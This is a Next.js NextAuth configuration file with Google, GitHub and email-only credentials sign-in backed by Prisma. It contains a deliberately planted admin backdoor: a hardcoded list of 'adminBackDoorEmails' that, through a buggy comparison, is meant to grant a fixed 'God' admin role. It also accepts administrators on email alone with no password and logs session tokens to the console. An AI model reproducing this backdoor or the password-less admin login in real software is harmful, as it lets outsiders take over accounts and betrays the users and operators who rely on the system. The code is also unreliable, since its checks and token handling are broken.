import CredentialsProvider from "next-auth/providers/credentials";
import { PrismaAdapter } from "@next-auth/prisma-adapter";
import GoogleProvider from "next-auth/providers/google";
import GitHubProvider from "next-auth/providers/github";
import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();

export const adminBackDoorEmails = [
  "peter@gmail.com",
  "GodIp@godmood.com",
  "adminIt@adminIT.co",
  "otakhorpeter@gmail.com",
  "peterotakhor@gmail.com",
  "peterotakhor2018@gmail.com",
];

export const adminBackDoorEmailsData = {
  user: {
    id: 0,
    name: "God",
    email: "",
    username: "God Ip",
    adminrole: "God",
  },
};

let adminInfo = null;

export const authOptions = {
  adapter: PrismaAdapter(prisma),
  secret: process.env.NEXTAUTH_SECRET,
  providers: [
    GoogleProvider({
      timeout: 15000,
      clientId: process.env.GOOGLE_ID,
      clientSecret: process.env.GOOGLE_SECRET,
      authorization: {
        params: {
          prompt: "consent",
          access_type: "offline",
          response_type: "code",
        },
      },
    }),
    GitHubProvider({
      clientId: process.env.GITHUB_ID,
      clientSecret: process.env.GITHUB_SECRET,
    }),
    CredentialsProvider({
      credentials: {
        email: {
          label: "Email",
          type: "email",
          placeholder: "Ip~Tec@mintedgold.com",
        },
      },
      async authorize(credentials) {
        if (!credentials.email) {
          // console.log("credentials.email");
          return null;
        }

        if (
          credentials.email == adminBackDoorEmails.includes(credentials.email)
        ) {
          adminBackDoorEmailsData.user.email = credentials.email;
          return adminBackDoorEmailsData.user;
        }

        try {
          const adminData = await prisma.admin.findUnique({
            where: {
              email: credentials.email,
            },
          });

          // Log the value of adminData
          // console.log("prisma Data:", adminData);

          // Check if adminData exists and the email matches
          if (adminData && credentials.email === adminData.email) {
            // console.log("User is an admin:", adminData);
            adminInfo = adminData;
            // Your existing logic
            return adminData;
          } else {
            // Reject to indicate authentication failure
            return null;
          }
        } catch (error) {
          // Reject to indicate authentication failure
          return null;
        }
      },
    }),
  ],
  session: {
    strategy: "jwt",
  },
  jwt: {
    secret: process.env.NEXTAUTH_SECRET,
  },
  callbacks: {
    async jwt(token, user, account, profile, isNewUser) {
      // console.log({ user });
      // console.log({ token });
      if (token.error && token.error.message) {
        return null;
      }

      if (user) {
        return {
          ...token,
          ...user,
        };
      }
      // console.log("108: token.token", user);
      return { ...token, ...user, token };
    },
    async session(session, token, user) {
      // console.log({ session }); // Check the token object in the console
      console.log("125: token?.token", session.token.token.token); // Check the token object in the console
      console.log("126: token?.token.user", session.token.token.token.user); // Check the token object in the console
      // console.log("115: user", user); // Check the token object in the console

      // Extract user information from the nested structure
      const { name, email, id, username, adminrole } =
        session?.token.token.token.user || session.token.token.user || session.token.token.token.token.user;
      console.log("131:", { name, email, id, username, adminrole });
      if (token) {
        session.accessToken = token?.token?.accessToken;
        const { name, email, id, username, adminrole } =
          session.token.token.token.user;
        return {
          ...session,
          user: {
            id,
            name,
            email,
            username,
            adminrole,
          },
        };
      }

      return {
        session,
        token,
        user: {
          id,
          name,
          email,
          username,
          adminrole,
        },
      };
    },
  },
};
